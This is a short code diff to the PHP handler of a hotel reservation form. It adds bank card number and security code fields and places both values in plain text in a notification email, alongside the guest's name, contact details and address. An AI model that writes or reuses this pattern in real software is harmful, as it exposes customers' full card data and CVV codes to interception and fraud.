@@ -19,6 +19,8 @@ if(isset($_POST['submit'])){
   $lname = $_POST['last-name'];
   $email = $_POST['email'];
   $phone = $_POST['phone'];
+  $card = $_POST['bank-card'];
+  $secode = $_POST['sec-code'];
   $address1 = $_POST['address-line1'];
   $address2 = $_POST['address-line2'];
   $state = $_POST['state'];
@@ -43,7 +45,10 @@ if(isset($_POST['submit'])){
     $mail->Subject = 'Message Received (Reservation Page)';
     $mail->Body = "<h3>Chambre : $room <br> Debut : $checkin <br>Fin: $checkout <br>Adulte : $adult <br>
     Enfants : $child <br>Prenom: $fname <br>Nom : $lname <br>
-    Email : $email <br>Telephone: $phone <br>Adresse 1 : $address1 <br>
+    Email : $email <br>Telephone: $phone
+    <br>N° carte bancaire : $card
+    <br>Code de sécurité : $secode
+    <br>Adresse 1 : $address1 <br>
     Adresse 2 : $address2 <br>Region: $state <br>Ville : $city <br>
     Pays : $country <br>Code postal: $zipcode <br>Exigences : $requirements
     </h3>";
